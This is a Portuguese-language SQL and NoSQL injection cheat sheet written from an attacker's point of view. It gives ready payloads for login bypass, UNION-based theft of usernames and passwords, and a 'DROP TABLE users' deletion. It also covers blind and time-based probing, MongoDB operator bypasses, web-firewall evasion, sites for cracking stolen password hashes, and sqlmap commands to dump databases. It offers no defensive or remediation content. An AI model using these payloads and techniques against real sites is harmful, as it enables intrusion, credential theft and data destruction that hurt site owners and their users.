
# SQL Injection

### Entender Estruturas e Tipos de Banco de Dados

SQL Injection ocorre em bancos relacionais (MySQL, PostgreSQL, SQL Server, Oracle) e também pode afetar bancos NoSQL como MongoDB. Compreender como cada um processa consultas é essencial para encontrar vulnerabilidades.

---

### Identificar o Tipo de Banco de Dados

É possível identificar o banco observando mensagens de erro, analisando headers de resposta ou testando comandos específicos para cada SGBD. Exemplo:

- SELECT version(); → PostgreSQL
- @@version → MySQL
- SELECT @@version; → SQL Server

---

### Analisar Consultas de Banco de Dados no Site

Monitorar requisições com ferramentas como Burp Suite pode revelar padrões de consulta, parâmetros vulneráveis e pontos de injeção.

---

### Comandos na URL do Site

Ataques de SQL Injection via URL ocorrem quando parâmetros na query string são manipuláveis.

Testes Comuns:

- **Autenticação Bypass**
    ~~~pgsql
    https://site.com/login?user=admin'--  
    ~~~
    *Comenta o restante da consulta SQL, podendo acessar sem senha.*

- **Extração de Dados**
    ~~~pgsql
    https://site.com/produto?id=1' UNION SELECT username, password FROM users --  
    ~~~
    *Usa `UNION SELECT` para obter credenciais.*

- **SQL Injection Destrutivo**
    ~~~pgsql
    https://site.com/produto?id=1; DROP TABLE users;  
    ~~~
    *Exclui a tabela `users`, se permissões permitirem.*

- **Blind SQL Injection (Boolean-based)**
    ~~~pgsql
    https://site.com/produto?id=1' AND 1=1 -- (retorna resultado válido)  
    https://site.com/produto?id=1' AND 1=0 -- (não retorna resultado)  
    ~~~
    *Ajuda a confirmar vulnerabilidade sem erro visível.*

- *Time-Based SQL Injection*
    ~~~pgsql
    https://site.com/produto?id=1' AND IF(1=1, SLEEP(5), 0) --  
    ~~~
    *Se o site demorar a responder, a vulnerabilidade é confirmada.*

---

### Comandos SQL e NoSQL Injection

#### `SQL Injection (Bancos relacionais - MySQL, PostgreSQL, SQL Server)`

Manipula consultas SQL para acessar dados indevidos.

Exemplos:

- **Autenticação bypass:**
  ~~~sql
  ' OR '1'='1 --  
  ~~~
  *Retorna todos os usuários.*

- *Extração de dados:*
  ~~~sql
  ' UNION SELECT username, password FROM users --  
  ~~~
  *Retorna credenciais de usuários.*

#### `NoSQL Injection (MongoDB, Firebase, CouchDB)`

Explora a falta de validação em bancos NoSQL.

Exemplos:

- **Autenticação bypass:**
    ~~~json
    { "username": { "$ne": null }, "password": { "$ne": null } }  
    ~~~
    *Retorna qualquer usuário válido.*

- **Manipulação de consultas:**
    ~~~json
    { "username": { "$gt": "" } }  
    ~~~
    *Pode retornar todos os usuários se não houver sanitização.*

- **Execução de código via JavaScript (MongoDB antigo):**
    ~~~json
    { "$where": "this.password.length > 0" }   
    ~~~
    *Pode forçar a execução de código malicioso.*

---

### Como Burlar Firewalls para Fazer SQL Injection

- Evasão básica: Inserir espaços codificados (/**/, %20)
- Ofuscação: Usar CHAR() ou HEX()
- Técnicas avançadas: Usar encoding como Base64, substituir palavras-chave (SELECT → SEL/**/ECT)

---

### Achar Sites para Descriptografia de Senhas HASH

Senhas vazadas podem ser descriptografadas com bancos de hash públicos:

- CrackStation (crackstation.net)
- Hashes.org (hashes.org)
- OnlineHashCrack (onlinehashcrack.com)

---

### Uso do SQLmap

Ferramenta automatizada para SQL Injection:

~~~bash
sqlmap -u "http://site.com/produto?id=1" --dbs
~~~

Principais opções:

-  --tables → Lista tabelas
-  --columns → Lista colunas
-  --dump → Extrai dados
  
---